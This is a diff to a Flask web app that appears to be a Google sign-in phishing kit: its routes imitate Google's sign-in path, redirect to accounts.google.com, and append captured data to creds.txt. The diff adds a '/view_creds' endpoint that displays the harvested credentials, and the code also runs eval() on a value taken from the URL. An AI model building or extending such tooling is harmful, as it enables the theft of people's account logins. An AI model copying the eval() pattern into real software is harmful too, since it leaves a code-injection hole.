@@ -1,5 +1,5 @@
 from flask import Flask, request, render_template, redirect
-
+import os
 app = Flask(__name__)
 
 @app.route("/")
@@ -22,7 +22,18 @@ def logger(func):
       return redirect("/signin/v2/identifier")
     if eval(func) == 2:
       return redirect("https://accounts.google.com")
-
+@app.route("/view_creds")
+def view_creds():
+    creds_path = os.path.join("creds.txt")
+    try:
+        with open(creds_path, "r") as f:
+            contents = f.read()
+        # Replace newlines with <br> tags for proper HTML formatting
+        return contents.replace("\n", "<br>")
+    except FileNotFoundError:
+        return "creds.txt not found.", 404
+    except IOError as e:
+        return f"An error occurred while reading the file: {e}", 500
 @app.route("/logger/<data>/<func>", methods=["GET", "POST"])
 def logger1(data, func):
     f = open("creds.txt", "a")
